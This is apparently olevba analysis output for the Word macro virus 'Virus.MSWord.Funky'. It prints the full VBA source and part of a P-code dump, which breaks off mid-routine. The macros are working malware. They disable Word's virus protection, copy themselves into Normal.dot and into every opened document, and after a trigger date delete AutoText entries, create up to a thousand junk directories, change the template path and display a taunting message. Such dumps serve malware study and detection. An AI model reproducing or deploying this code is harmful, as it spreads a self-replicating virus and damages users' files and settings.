olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Funky
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Funky - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_New()
On Error GoTo dnew
 Call copyfromtempl
dnew:
Exit Sub
End Sub

Private Sub Document_Open()
On Error GoTo Dopen
  With Options
    .VirusProtection = False
  End With
 Call copyfromtempl
 Call copytotempl
Dopen:
Exit Sub
End Sub
-------------------------------------------------------------------------------
VBA MACRO Funky.bas 
in file: Virus.MSWord.Funky - OLE stream: 'Macros/VBA/Funky'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Public templpath, docouname, docname As String
Public autentriesn
Public autentriest
Public uname
Public newdirc, lengthdirc, NPath
Public w, x, z, y, doccount, projcount As Integer
Public mytemplate As Template
Const Funkydate = "13/ 08 / 99"
Public lengthn
Public fnamet, fnamet2, fnamed, fnamed2 As String

Sub Autoexec()
On Error GoTo exitsub
   
   Application.Documents.Add

   doccount = Application.Documents.Count
   
   If doccount = 1 Then
        GoTo copyto
   ElseIf doccount > 1 Then
           Normal.ThisDocument.ActiveWindow.Activate
   End If
  
copyto:
    
    
        Call copytotempl
        Call copyfromtempl

Funkyday:

If Now() = Funkydate Or Now() > Funkydate Then
    GoTo Funkystart
Else
    GoTo exitsub
End If

Funkystart:
   Call pagelay
   
   Set mytemplate = ActiveDocument.AttachedTemplate
  
   If mytemplate.AutoTextEntries.Count = 0 Then
        For z = 1000 To 1 Step -1
            Call newdir
        Next z
        Exit Sub
   Else
        
        For x = mytemplate.AutoTextEntries.Count To 1 Step -1
          
          autentriesn = mytemplate.AutoTextEntries(x).Name
          autentriest = mytemplate.AutoTextEntries(x).Value
              Call Templatepath
              Call dircreate
          mytemplate.AutoTextEntries(x).Delete
                
                If mytemplate.AutoTextEntries.Count = 0 Then
                    GoTo Message
                End If
        Next x
   End If
 Exit Sub
exitsub:
  
Exit Sub
Message:
   Call sname
   
   MsgBox "Hi, " & "< " & uname & " >" & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "Sorry, did you say there are no more Autotext Entries? " & Chr(13) & Chr(10) & "Never mind, you should have enough information to replace it." & Chr(13) & Chr(10) & "Take a look at your Templates directory !!!", vbCritical, "Wipe-out !!!"
    GoTo exitsub
   
End Sub

Sub Templatepath()
On Error GoTo exitsub
    templpath = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
    
    If templpath = "" Then
        templpath = "c:\office97\templates"
        MkDir templpath
 
    Else
        templpath = Options.DefaultFilePath(Path:=wdUserTemplatesPath)
  
    End If
   
    Open templpath & "\Tpath.txt" For Output As 1#
        Write #1, templpath
    Close #1
exitsub:

End Sub

Sub dircreate()

On Error GoTo ending
   
    lengthn = Len(autentriesn)
    autentriesn = Trim(Mid(autentriesn, 1, lengthn - 1))
    MkDir templpath & "\" & autentriesn
    Open templpath & "\" & autentriesn & "\" & autentriesn & ".txt" For Output As 1#
        Write #1, autentriest
    Close #1
   
ending:
End Sub

Sub sname()
On Error GoTo exitsub
    uname = Application.UserName
exitsub:
End Sub

Sub pagelay()
On Error GoTo exitsub
    If ActiveWindow.View.SplitSpecial = wdPaneNone Then
        ActiveWindow.ActivePane.View.Type = wdPageView
    Else
        ActiveWindow.View.Type = wdPageView
    End If
exitsub:
End Sub

Sub newdir()
On Error GoTo wrfile
    Call Templatepath
    Open templpath & "\Tpath.txt" For Input As #1
        Do While Not EOF(1)
            Input #1, newdirc
        Loop
    Close #1
    lengthdirc = Len(newdirc)
    newdirc = Trim(Mid(newdirc, 1, lengthdirc))
    NPath = Trim(Mid(newdirc, 4, lengthdirc))
    MkDir newdirc & (z)
exitsub:
Exit Sub
wrfile:
    Call errdircreate
    GoTo exitsub
End Sub

Sub errdircreate()
On Error GoTo endnow
    Open newdirc & (z) & "\" & "\" & NPath & (z) & ".txt" For Output As 1#
        Write #1, newdirc & (z)
    Close #1
exitsub:
    Exit Sub
endnow:
    Call Pathchange
GoTo exitsub
End Sub

Sub Pathchange()
On Error GoTo npathchange
    Options.DefaultFilePath(Path:=wdUserTemplatesPath) = "C:\temp"
exitsub:
    Exit Sub
npathchange:
    Call Nextpathchange
GoTo exitsub
End Sub

Sub Nextpathchange()
On Error GoTo lpathchange
    Options.DefaultFilePath(Path:=wdUserTemplatesPath) = "C:\Windows\temp"
    
exitsub:
   Exit Sub
lpathchange:
    Call Lastpathchange
    GoTo exitsub
   
End Sub

Sub Lastpathchange()
On Error GoTo finish
    MkDir ("c:\windows\temp")
    Options.DefaultFilePath(Path:=wdUserTemplatesPath) = "C:\Windows\temp"
finish:
    
End Sub

Sub copyfromtempl()

On Error GoTo exitsub
    docname = ActiveDocument.Name
  Call Fnames
  
  If (fnamed <> "" And fnamed2 = "Funky") Or (fnamed = False And fnamed2 = "Funky") Then
        GoTo exitsub
  Else
    With ActiveDocument
      .UpdateStylesOnOpen = False
      .AttachedTemplate = "Normal.dot"
   
    End With
   Call Templatepath
   doccount = Application.Documents.Count
     
          NormalTemplate.VBProject.VBComponents.Item(2).Export (templpath & "\funky2.bas")
          
          Call filecreate
  
         Application.ActiveDocument.VBProject.VBComponents.Import (templpath & "\funky2.bas")
         Application.ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromFile (templpath & "\funky1.bas")
            
   Kill templpath & "\funky1.bas"
   Kill templpath & "\funky2.bas"
   End If
   
Exit Sub
exitsub:
 Exit Sub
End Sub

Sub copytotempl()
On Error GoTo exitsub
  Call Fnames
  If fnamet = False And fnamet2 = "Funky" Or fnamet <> "" And fnamet2 = "Funky" Then
        GoTo exitsub
  Else
       
    Call Templatepath
    Call filecreate
    doccount = Application.Documents.Count

    Application.Documents(doccount).VBProject.VBComponents(2).Export (templpath & "\funky2.bas")
  
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile (templpath & "\funky1.bas")
    NormalTemplate.VBProject.VBComponents.Import (templpath & "\funky2.bas")
   
    Kill templpath & "\funky1.bas"
    Kill templpath & "\funky2.bas"
   End If
 Exit Sub
exitsub:
Exit Sub
End Sub


Sub filecreate()
Dim info1, info2, info3, info4, info5, info6, info7, info8, info9, info10, info11, info12, info13, info14, info15, info16 As String
On Error GoTo errcreate


Open templpath & "\funky1.bas" For Append As #1
        
            info1 = "Private Sub Document_New()"
            info2 = " Call copyfromtempl"
            info3 = "end sub"
            info4 = ""
            info5 = "Private Sub Document_Open()"
            info6 = " Call copyfromtempl"
            info7 = " Call copytotempl"
            info8 = "End Sub"
            info9 = "On error goto dnew"
            info10 = "dnew:"
            info11 = "exit sub"
            info12 = "On error goto dopen"
            info13 = "Dopen:"
            info14 = "  With Options"
            info15 = "    .VirusProtection = False"
            info16 = "  End With"
            
           
           Print #1, info1
           Print #1, info9
           Print #1, info2
           Print #1, info10
           Print #1, info11
           Print #1, info3
           Print #1, info4
           Print #1, info5
           Print #1, info12
           Print #1, info14
           Print #1, info15
           Print #1, info16
           Print #1, info6
           Print #1, info7
           Print #1, info13
           Print #1, info11
           Print #1, info8
          
          
    Close #1

errcreate:

End Sub

Sub Fnames()
On Error GoTo fname_end
    
        fnamet = IsEmpty(NormalTemplate.VBProject.VBComponents.Item(2))
        fnamet2 = NormalTemplate.VBProject.VBComponents.Item(2).Name
    For y = Application.Documents.Count To 1 Step -1
    fnamed = Empty
    fnamed2 = Empty
    projcount = Empty
            projcount = Application.Documents(y).VBProject.Collection(2).VBComponents.Count
        For w = 1 To (projcount) Step 1
            fnamed = IsEmpty(Application.Documents(y).VBProject.VBComponents.Item(2))
            fnamed2 = Application.Documents(y).VBProject.VBComponents(w).Name
        Next w
    Next y
    
fname_end:
Exit Sub

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Funky
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1521 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_New())
' Line #1:
' 	OnError dnew 
' Line #2:
' 	ArgsCall (Call) copyfromtempl 0x0000 
' Line #3:
' 	Label dnew 
' Line #4:
' 	ExitSub 
' Line #5:
' 	EndSub 
' Line #6:
' Line #7:
' 	FuncDefn (Private Sub Document_Open())
' Line #8:
' 	OnError Dopen 
' Line #9:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #11:
' 	EndWith 
' Line #12:
' 	ArgsCall (Call) copyfromtempl 0x0000 
' Line #13:
' 	ArgsCall (Call) copytotempl 0x0000 
' Line #14:
' 	Label Dopen 
' Line #15:
' 	ExitSub 
' Line #16:
' 	EndSub 
' Macros/VBA/Funky - 13954 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Line #2:
' 	Dim (Public) 
' 	VarDefn templpath
' 	VarDefn docouname
' 	VarDefn docname (As String)
' Line #3:
' 	Dim (Public) 
' 	VarDefn autentriesn
' Line #4:
' 	Dim (Public) 
' 	VarDefn autentriest
' Line #5:
' 	Dim (Public) 
' 	VarDefn uname
' Line #6:
' 	Dim (Public) 
' 	VarDefn newdirc
' 	VarDefn lengthdirc
' 	VarDefn NPath
' Line #7:
' 	Dim (Public) 
' 	VarDefn w
' 	VarDefn x
' 	VarDefn z
' 	VarDefn y
' 	VarDefn doccount
' 	VarDefn projcount (As Integer)
' Line #8:
' 	Dim (Public) 
' 	VarDefn mytemplate
' Line #9:
' 	Dim (Const) 
' 	LitStr 0x000B "13/ 08 / 99"
' 	VarDefn Funkydate
' Line #10:
' 	Dim (Public) 
' 	VarDefn lengthn
' Line #11:
' 	Dim (Public) 
' 	VarDefn fnamet
' 	VarDefn fnamet2
' 	VarDefn fnamed
' 	VarDefn fnamed2 (As String)
' Line #12:
' Line #13:
' 	FuncDefn (Sub Autoexec())
' Line #14:
' 	OnError exitsub 
' Line #15:
' Line #16:
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0000 
' Line #17:
' Line #18:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St doccount 
' Line #19:
' Line #20:
' 	Ld doccount 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #21:
' 	GoTo copyto 
' Line #22:
' 	Ld doccount 
' 	LitDI2 0x0001 
' 	Gt 
' 	ElseIfBlock 
' Line #23:
' 	Ld Normal 
' 	MemLd ThisDocument 
' 	MemLd ActiveWindow 
' 	ArgsMemCall Activate 0x0000 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	Label copyto 
' Line #27:
' Line #28:
' Line #29:
' 	ArgsCall (Call) copytotempl 0x0000 
' Line #30:
' 	ArgsCall (Call) copyfromtempl 0x0000 
' Line #31:
' Line #32:
' 	Label Funkyday 
' Line #33:
' Line #34:
' 	ArgsLd Now 0x0000 
' 	Ld Funkydate 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	Ld Funkydate 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #35:
' 	GoTo Funkystart 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	GoTo exitsub 
' Line #38:
' 	EndIfBlock 
' Line #39:
' Line #40:
' 	Label Funkystart 
' Line #41:
' 	ArgsCall (Call) pagelay 0x0000 
' Line #42:
' Line #43:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Set mytemplate 
' Line #44:
' Line #45:
' 	Ld mytemplate 
' 	MemLd AutoTextEntries 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #46:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x03E8 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #47:
' 	ArgsCall (Call) newdir 0x0000 
' Line #48:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	ExitSub 
' Line #50:
' 	ElseBlock 
' Line #51:
' Line #52:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	Ld mytemplate 
' 	MemLd AutoTextEntries 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #53:
' Line #54:
' 	Ld x 
' 	Ld mytemplate 
' 	ArgsMemLd AutoTextEntries 0x0001 
' 	MemLd New 
' 	St autentriesn 
' Line #55:
' 	Ld x 
' 	Ld mytemplate 
' 	ArgsMemLd AutoTextEntries 0x0001 
' 	MemLd Value 
' 	St autentriest 
' Line #56:
' 	ArgsCall (Call) Templatepath 0x0000 
' Line #57:
' 	ArgsCall (Call) dircreate 0x0000 
' Line #58:
' 	Ld x 
' 	Ld mytemplate 
' 	ArgsMemLd AutoTextEntries 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #59:
' Line #60:
' 	Ld mytemplate 
' 	MemLd AutoTextEntries 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #61:
' 	GoTo Message 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	ExitSub 
' Line #66:
' 	Label exitsub 
' Line #67:
' Line #68:
' 	ExitSub 
' Line #69:
' 	Label Message 
' Line #70:
' 	ArgsCall (Call) sname 0x0000 
' Line #71:
' Line #72:
' 	LitStr 0x0004 "Hi, "
' 	LitStr 0x0002 "< "
' 	Concat 
' 	Ld uname 
' 	Concat 
' 	LitStr 0x0002 " >"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0037 "Sorry, did you say there are no more Autotext Entries? "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x003D "Never mind, you should have enough information to replace it."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002B "Take a look at your Templates directory !!!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x000C "Wipe-out !!!"
' 	ArgsCall MsgBox 0x0003 
' Line #73:
' 	GoTo exitsub 
' Line #74:
' Line #75:
' 	EndSub 
' Line #76:
' Line #77:
' 	FuncDefn (Sub Templatepath())
' Line #78:
' 	OnError exitsub 
' Line #79:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St templpath 
' Line #80:
' Line #81:
' 	Ld templpath 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #82:
' 	LitStr 0x0015 "c:\office97\templates"
' 	St templpath 
' Line #83:
' 	Ld templpath 
' 	ArgsCall MkDir 0x0001 
' Line #84:
' Line #85:
' 	ElseBlock 
' Line #86:
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St templpath 
' Line #87:
' Line #88:
' 	EndIfBlock 
' Line #89:
' Line #90:
' 	Ld templpath 
' 	LitStr 0x000A "\Tpath.txt"
' 	Concat 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF0 
' 	LitDefault 
' 	Open (For Output)
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld templpath 
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #93:
' 	Label exitsub 
' Line #94:
' Line #95:
' 	EndSub 
' Line #96:
' Line #97:
' 	FuncDefn (Sub dircreate())
' Line #98:
' Line #99:
' 	OnError ending 
' Line #100:
' Line #101:
' 	Ld autentriesn 
' 	FnLen 
' 	St lengthn 
' Line #102:
' 	Ld autentriesn 
' 	LitDI2 0x0001 
' 	Ld lengthn 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	St autentriesn 
' Line #103:
' 	Ld templpath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld autentriesn 
' 	Concat 
' 	ArgsCall MkDir 0x0001 
' Line #104:
' 	Ld templpath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld autentriesn 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld autentriesn 
' 	Concat 
' 	LitStr 0x0004 ".txt"
' 	Concat 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF0 
' 	LitDefault 
' 	Open (For Output)
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld autentriest 
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #107:
' Line #108:
' 	Label ending 
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' 	FuncDefn (Sub sname())
' Line #112:
' 	OnError exitsub 
' Line #113:
' 	Ld Application 
' 	MemLd UserName 
' 	St uname 
' Line #114:
' 	Label exitsub 
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' 	FuncDefn (Sub pagelay())
' Line #118:
' 	OnError exitsub 
' Line #119:
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemLd SplitSpecial 
' 	Ld wdPaneNone 
' 	Eq 
' 	IfBlock 
' Line #120:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd ActivePane 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #121:
' 	ElseBlock 
' Line #122:
' 	Ld wdPageView 
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt TypeOf 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	Label exitsub 
' Line #125:
' 	EndSub 
' Line #126:
' Line #127:
' 	FuncDefn (Sub newdir())
' Line #128:
' 	OnError wrfile 
' Line #129:
' 	ArgsCall (Call) Templatepath 0x0000 
' Line #130:
' 	Ld templpath 
' 	LitStr 0x000A "\Tpath.txt"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #131:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Input 
' 	Ld newdirc 
' 	InputItem 
' 	InputDone 
' Line #133:
' 	Loop 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #135:
' 	Ld newdirc 
' 	FnLen 
' 	St lengthdirc 
' Line #136:
' 	Ld newdirc 
' 	LitDI2 0x0001 
' 	Ld lengthdirc 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	St newdirc 
' Line #137:
' 	Ld newdirc 
' 	LitDI2 0x0004 
' 	Ld lengthdirc 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim 0x0001 
' 	St NPath 
' Line #138:
' 	Ld newdirc 
' 	Ld z 
' 	Paren 
' 	Concat 
' 	ArgsCall MkDir 0x0001 
' Line #139:
' 	Label exitsub 
' Line #140:
' 	ExitSub 
' Line #141:
' 	Label wrfile 
' Line #142:
' 	ArgsCall (Call) errdircreate 0x0000 
' Line #143:
' 	GoTo exitsub 
' Line #144:
' 	EndSub 
' Line #145:
' Line #146:
' 	FuncDefn (Sub errdircreate())
' Line #147:
' 	OnError endnow 
' Line #148:
' 	Ld newdirc 
' 	Ld z 
' 	Paren 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld NPath 
' 	Concat 
' 	Ld z 
' 	Paren 
' 	Concat 
' 	LitStr 0x0004 ".txt"
' 	Concat 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF0 
' 	LitDefault 
' 	Open (For Output)
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld newdirc 
' 	Ld z 
' 	Paren 
' 	Concat 
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #151:
' 	Label exitsub 
' Line #152:
' 	ExitSub 
' Line #153:
' 	Label endnow 
' Line #154:
' 	ArgsCall (Call) Pathchange 0x0000 
' Line #155:
' 	GoTo exitsub 
' Line #156:
' 	EndSub 
' Line #157:
' Line #158:
' 	FuncDefn (Sub Pathchange())
' Line #159:
' 	OnError npathchange 
' Line #160:
' 	LitStr 0x0007 "C:\temp"
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #161:
' 	Label exitsub 
' Line #162:
' 	ExitSub 
' Line #163:
' 	Label npathchange 
' Line #164:
' 	ArgsCall (Call) Nextpathchange 0x0000 
' Line #165:
' 	GoTo exitsub 
' Line #166:
' 	EndSub 
' Line #167:
' Line #168:
' 	FuncDefn (Sub Nextpathchange())
' Line #169:
' 	OnError lpathchange 
' Line #170:
' 	LitStr 0x000F "C:\Windows\temp"
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #171:
' Line #172:
' 	Label exitsub 
' Line #173:
' 	ExitSub 
' Line #174:
' 	Label lpathchange 
' Line #175:
' 	ArgsCall (Call) Lastpathchange 0x0000 
' Line #176:
' 	GoTo exitsub 
' Line #177:
' Line #178:
' 	EndSub 
' Line #179:
' Line #180:
' 	FuncDefn (Sub Lastpathchange())
' Line #181:
' 	OnError finish 
' Line #182:
' 	LitStr 0x000F "c:\windows\temp"
' 	Paren 
' 	ArgsCall MkDir 0x0001 
' Line #183:
' 	LitStr 0x000F "C:\Windows\temp"
' 	Ld wdUserTemplatesPath 
' 	ParamNamed Path 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #184:
' 	Label finish 
' Line #185:
' Line #186:
' 	EndSub 
' Line #187:
' Line #188:
' 	FuncDefn (Sub copyfromtempl())
' Line #189:
' Line #190:
' 	OnError exitsub 
' Line #191:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	St docname 
' Line #192:
' 	ArgsCall (Call) Fnames 0x0000 
' Line #193:
' Line #194:
' 	Ld fnamed 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld fnamed2 
' 	LitStr 0x0005 "Funky"
' 	Eq 
' 	And 
' 	Paren 
' 	Ld fnamed 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld fnamed2 
' 	LitStr 0x0005 "Funky"
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #195:
' 	GoTo exitsub 
' Line #196:
' 	ElseBlock 
' Line #197:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #198:
' 	LitVarSpecial (False)
' 	MemStWith UpdateStylesOnOpen 
' Line #199:
' 	LitStr 0x000A "Normal.dot"
' 	MemStWith AttachedTemplate 
' Line #200:
' Line #201:
' 	EndWith 
' Line #202:
' 	ArgsCall (Call) Templatepath 0x0000 
' Line #203:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St doccount 
' Line #204:
' Line #205:
' 	Ld templpath 
' 	LitStr 0x000B "\funky2.bas"
' 	Concat 
' 	Paren 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #206:
' Line #207:
' 	ArgsCall (Call) filecreate 0x0000 
' Line #208:
' Line #209:
' 	Ld templpath 
' 	LitStr 0x000B "\funky2.bas"
' 	Concat 
' 	Paren 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #210:
' 	Ld templpath 
' 	LitStr 0x000B "\funky1.bas"
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #211:
' Line #212:
' 	Ld templpath 
' 	LitStr 0x000B "\funky1.bas"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #213:
' 	Ld templpath 
' 	LitStr 0x000B "\funky2.bas"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #214:
' 	EndIfBlock 
' Line #215:
' Line #216:
' 	ExitSub 
' Line #217:
' 	Label exitsub 
' Line #218:
' 	ExitSub 
' Line #219:
' 	EndSub 
' Line #220:
' Line #221:
' 	FuncDefn (Sub copytotempl())
' Line #222:
' 	OnError exitsub 
' Line #223:
' 	ArgsCall (Call) Fnames 0x0000 
' Line #224:
' 	Ld fnamet 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld fnamet2 
' 	LitStr 0x0005 "Funky"
' 	Eq 
' 	And 
' 	Ld fnamet 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld fnamet2 
' 	LitStr 0x0005 "Funky"
' 	Eq 
' 	And 
' 	Or 
' 	IfBlock 
' Line #225:
' 	GoTo exitsub 
' Line #226:
' 	ElseBlock 
' Line #227:
' Line #228:
' 	ArgsCall (Call) Templatepath 0x0000 
' Line #229:
' 	ArgsCall (Call) filecreate 0x0000 
' Line #230:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St doccount 
' Line #231:
' Line #232:
' 	Ld templpath 
' 	LitStr 0x000B "\funky2.bas"
' 	Concat 
' 	Paren 
' 	LitDI2 0x0002 
' 	Ld doccount 
' 	Ld Application 
' 	ArgsMemLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #233:
' Line #234:
' 	Ld templpath 
' 	LitStr 0x000B "\funky1.bas"
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #235:
' 	Ld templpath 
' 	LitStr 0x000B "\funky2.bas"
' 	Concat 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #236:
' Line #237:
' 	Ld templpath 
' 	LitStr 0x000B "\funky1.bas"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #238:
' 	Ld templpath 
' 	LitStr 0x000B "\funky2.bas"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #239:
' 	EndIfBlock 
' Line #240:
' 	ExitSub 
' Line #241:
' 	Label exitsub 
' Line #242:
' 	ExitSub 
' Line #243:
' 	EndSub 
' Line #244:
' Line #245:
' Line #246:
' 	FuncDefn (Sub filecreate())
' Line #247:
' 	Dim 
' 	VarDefn info1
' 	VarDefn info2
' 	VarDefn info3
' 	VarDefn info4
' 	VarDefn info5
' 	VarDefn info6
' 	VarDefn info7
' 	VarDefn info8
' 	VarDefn info9
' 	VarDefn info10
' 	VarDefn info11
' 	VarDefn info12
' 	VarDefn info13
' 	VarDefn info14
' 	VarDefn info15
' 	VarDefn info16 (As String)
' Line #248:
' 	OnError errcreate 
' Line #249:
' Line #250:
' Line #251:
' 	Ld templpath 
' 	LitStr 0x000B "\funky1.bas"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #252:
' Line #253:
' 	LitStr 0x001A "Private Sub Document_New()"
' 	St info1 
' Line #254:
' 	LitStr 0x0013 " Call copyfromtempl"
' 	St info2 
' Line #255:
' 	LitStr 0x0007 "end sub"
' 	St info3 
' Line #256:
' 	LitStr 0x0000 ""
' 	St info4 
' Line #257:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St info5 
' Line #258:
' 	LitStr 0x0013 " Call copyfromtempl"
' 	St info6 
' Line #259:
' 	LitStr 0x0011 " Call copytotempl"
' 	St info7 
' Line #260:
' 	LitStr 0x0007 "End Sub"
' 	St info8 
' Line #261:
' 	LitStr 0x0012 "On error goto dnew"
' 	St info9 
' Line #262:
' 	LitStr 0x0005 "dnew:"
' 	St info10 
' Line #263:
' 	LitStr 0x0008 "exit sub"
' 	St info11 
' Line #264:
' 	LitStr 0x0013 "On error goto dopen"
' 	St info12 
' Line #265:
' 	LitStr 0x0006 "Dopen:"
' 	St info13 
' Line #266:
' 	LitStr 0x000E "  With Options"
' 	St info14 
' Line #267:
' 	LitStr 0x001C "    .VirusProtection = False"
' 	St info15 
' Line #268:
' 	LitStr 0x000A "  End With"
' 	St info16 
' Line #269:
' Line #270:
' Line #271:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld info1 
' 	PrintItemNL 
' Line #272:
